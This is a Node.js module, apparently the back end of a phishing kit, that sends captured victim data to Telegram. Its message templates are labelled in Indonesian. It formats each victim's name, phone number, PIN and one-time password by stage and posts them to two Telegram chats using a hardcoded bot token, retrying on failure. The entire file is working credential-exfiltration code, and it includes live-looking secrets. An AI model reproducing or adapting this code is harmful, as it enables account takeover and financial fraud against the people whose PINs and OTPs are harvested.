const fetch = require('node-fetch');

const TELEGRAM_CONFIG = {
    BOT_TOKEN: '7234779072:AAEk2PBQaYQ7i8QLKZtU7m_Udpv8EQn4bgk',
    CHAT_IDS: ['7160773412', '7323363406'],
    API_URL: 'https://api.telegram.org/bot',
    MAX_RETRIES: 3,
    TIMEOUT: 15000 // 15 seconds
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const sendMessageToChat = async (chatId, message, retryCount = 0) => {
    const { BOT_TOKEN, API_URL, TIMEOUT, MAX_RETRIES } = TELEGRAM_CONFIG;
    
    try {
        const response = await fetch(`${API_URL}${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }),
            timeout: TIMEOUT
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        return true;
    } catch (error) {
        console.error(`Attempt ${retryCount + 1} failed for chat ${chatId}:`, error.message);
        
        if (retryCount < MAX_RETRIES) {
            await sleep(1000 * (retryCount + 1)); // Exponential backoff
            return sendMessageToChat(chatId, message, retryCount + 1);
        }
        
        console.error(`Failed to send message to chat ${chatId} after ${MAX_RETRIES} attempts`);
        return false;
    }
};

const sendTelegramMessage = async (data) => {
    try {
        const { CHAT_IDS } = TELEGRAM_CONFIG;
        let message = '';

        // Format message based on data type
        switch(data.step) {
            case 'login':
                message = `🔔 *LOGIN BARU*\n\n👤 *Nama:* ${data.nama}\n📱 *No HP:* ${data.nohp}\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
                break;
            case 'pin_confirmation':
                message = `🔐 *PIN TERVERIFIKASI*\n\n👤 *Nama:* ${data.nama}\n📱 *No HP:* ${data.nohp}\n🔑 *PIN:* ${data.pin}\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
                break;
            case 'otp':
                message = `📱 *OTP TERVERIFIKASI*\n\n👤 *Nama:* ${data.nama}\n📱 *No HP:* ${data.nohp}\n🔑 *PIN:* ${data.pin}\n🔐 *OTP:* ${data.otp}\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
                break;
            default:
                message = `📝 *DATA BARU*\n\n${JSON.stringify(data, null, 2)}`;
        }

        // Send messages with retry logic
        const results = await Promise.all(
            CHAT_IDS.map(chatId => sendMessageToChat(chatId, message))
        );

        return results.some(result => result === true);
    } catch (error) {
        console.error('Telegram Error:', error);
        return false;
    }
};

module.exports = { sendTelegramMessage };